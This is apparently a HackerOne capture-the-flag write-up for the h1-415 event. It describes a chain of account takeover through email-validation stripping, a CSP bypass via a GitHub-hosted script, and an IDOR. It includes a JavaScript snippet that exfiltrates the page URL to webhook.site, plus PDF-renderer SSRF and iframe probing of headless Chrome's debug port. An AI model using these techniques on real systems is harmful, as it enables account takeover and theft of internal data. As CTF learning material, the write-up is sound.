@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/781253
+WeaknessName:Improper Access Control - Generic
+Reporter:https://hackerone.com/pirateducky
+ReportedTo:h1-415-ctf(h1-415-ctf)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:03.02.2020 20:48:00
+
+Summary:
+
+## Summary:
+[add summary of the vulnerability]
+Account takeover was possible because of the email validation used - `jobert@mydocz.cosmic<>{}` could be registered, but when the the system created the recovery `QR` code the extra symbols would get stripped leaving us with a valid recovery `QR` code to log into `jobert@mydocz.cosmic`. Once logged in we had access to the `support` bot (if you left a `1` star review, "someone" would come by and check our conversation) - here we realized we could inject markup however the CSP policy was pretty strict, the only outside script allowed to run needed to come from `https://github.com/mattboldt/typed.js/master/lib/` we found that we could append a github repo to this url and execute it's content `https://github.com/mattboldt/typed.js/master/lib/@https://github.com/username/repo_name/master/filename.js` you have to remove `/blob/` from the repo url.  Once we had execution we tried to exfiltrate `cookies` and anything we could think of, include `window.location.href` which gives you the current url the user is visiting, we did is using a script that looked like
+```js
+var image = document.createElement("img")
+var image.src = "webhook.site/1234/img.png?url= + window.location.href
+document.body.appendChild(image)
+``` 
+This allowed us to get the reviewer link to our conversation: `https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd` 
+Once you had access to the form in the reviews there's a form the reviewer has access to, to edit the user's name, this parameter was vulnerable to an IDOR - so you could edit anyone's name, we created a second trial account and tried to change its name - it worked, next we noticed the pdf's the application was creating rendered the name of the user - with this information we tried to inject html into the name using the IDOR we found and it worked! html is rendering, let's make a request to our server so we can get more information about what's creating these pdfs, here I used https://ssrftest.com to test for SSRF - there's a payload to use an image and try to get a request back to the server - it works and the header's that are important to us here are `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36` it tells us this is a headless browser Chrome running on linux, there's also a `Referer: http://localhost:3000/` so we know this is running behind a proxy - we spent a lot of time trying to figure out how to do the next thing - finally we started using an `iframe` to "peek" inside the application, trying ports, `80` returned `FORBIDDEN` and everything else we tried was blank, and then I remembered this was using `headless Chrome` so I used my google-fu and searched for `headless chrome port number` and the results were promising: 
+```
+chrome \
+  --headless \                   # Runs Chrome in headless mode.
+  --disable-gpu \                # Temporarily needed if running on Windows.
+  --remote-debugging-port=9222 \
+  https://www.chromestatus.com   # URL to open. Defaults to about:blank.
+```
+
+We used that port number like so: `<iframe src='http://localhost:9222 width=900 height=900></iframe>` this gave us back: 
+
+`Inspectable WebContents`  :( 
+
+but then we tried: `<iframe src='http://localhost:9222/json width=900 height=900></iframe>` and....
+
+we receive a json document with the important part being
+```
+secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/E20087FA03CA27A6E908AFD7E5321E88"```
+
+if you access: https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf
+
+It is done! 
+
+Thank you Hacker1 for hosting this event, I participated with 2 other awesome friends from the hacker101 discord @checkm50 & @ Al-MadjusT who without I would not have been able to finish it - we did it and took us every moment of it, but we did it. And it feels awesome! 
+
+This write up is last minute and it sucks, next time I'll write a better one, this one was all about getting it done.
+
+Again thank you!
+
+## Impact
+
+We finished it.
+
+We got to take over an account and compromise the internal network to retrieve the secret document.
